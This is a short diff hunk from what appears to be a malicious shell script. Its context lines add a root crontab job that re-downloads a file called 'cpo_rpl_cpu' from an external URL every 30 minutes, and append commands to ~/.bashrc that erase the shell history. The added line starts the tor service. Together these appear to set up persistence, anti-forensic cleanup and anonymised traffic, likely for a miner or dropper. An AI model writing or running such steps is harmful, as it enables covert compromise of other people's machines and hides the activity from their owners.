@@ -30,3 +30,4 @@ sudo crontab -l | { cat; echo "0,30 * * * * wget -p /root -O cpo_rpl_cpu https:/
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
 sleep 15
+sudo systemctl start tor
